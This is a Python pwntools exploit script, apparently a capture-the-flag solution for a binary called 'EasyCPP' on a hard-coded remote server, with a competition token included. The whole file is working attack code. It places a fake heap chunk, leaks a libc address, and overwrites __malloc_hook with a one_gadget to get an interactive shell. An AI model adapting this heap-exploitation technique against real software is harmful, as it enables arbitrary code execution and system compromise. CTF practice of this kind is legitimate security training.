#!/usr/bin/python
from pwn import *
import os
context.terminal = ["terminator", '-x', 'sh', '-c']
elfpath = os.path.join(os.getcwd(), "EasyCPP")
print(elfpath)
elf = ELF(elfpath)
context.arch = elf.arch

remote_ = 1
if remote_ == 1:
    io = remote("202.38.93.241", 10012)
    io.sendlineafter("token: ", "830:MEQCIF7bvCLTETqxfxZST/NXQApdSDj4zrOtXt2T7nstTRChAiAAmrlNWG8x+h1kq67eHMiQR/9WAuI2U4l7HPF98nfXKg==")
else:
    io = process(elfpath, aslr=1)
    base = io.libs()[elfpath]
    cmd = """b *0x{:x}""".format(base + 0x000)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ru = lambda x: io.recvuntil(x)
se = lambda x: io.send(x)
sea= lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla= lambda x, y: io.sendlineafter(x, y)
sla("name:", "admin".ljust(8, "A") + p64(0x91))
sea("word:", "p455w0rd")

def Edit(passwd):
    sla("choice:", "1")
    sea("password: ", passwd)
    sea("please:\n", "1")
    sla("grade(0~100):\n", "100")
    sla("grade:\n", "100")
    sla("grade:\n", "100")
    sla("grade:\n", "100")

def setPass(passwd):
    sla("choice:", "2")
    sea("password: ", passwd)

def want(passwd, ctx):
    sla("choice:", "1")
    sea("password: ", passwd)
    sea("please:\n", ctx)
    sla("grade(0~100):\n", "100")
    sla("grade:\n", "100")
    sla("grade:\n", "100")
    sla("grade:\n", "100")


payload = "\x00"*0x70 + p64(0) + p64(0x21) + p64(elf.sym['username']+0x10) + p64(0)*2 + p64(0x21)  # 栈上布置一个chunk
Edit(payload[:-1])
ru("STUDENT: ")
leak = u64(io.recvuntil("GPA: ", drop=True).ljust(8, "\x00"))-0x3c4b31
success("leak: 0x%x"%leak)


Edit("\x00")
Edit("\x00")
Edit("\x00")
Edit("\x00")
payload = p64(0) + p64(0x71) + "\x00"*0x60 + p64(0) + p64(0x21) + p64(elf.sym['password']+0x10)
Edit(payload[:-1])

libc.address = leak
setPass(p64(0) + p64(0x71) + p64(libc.sym["__malloc_hook"]-0x23))
payload = ("A"*0x13 + p64(libc.address + 0xf02a4)).ljust(0x60, "\x00")
want("\x00", payload)

print(payload)
want("\x00", payload)
# gdb.attach(io, "b *0x401AAB")
# pause()
sla("choice:", "1")
sea("password: ", "\x00")
io.interactive()
io.close()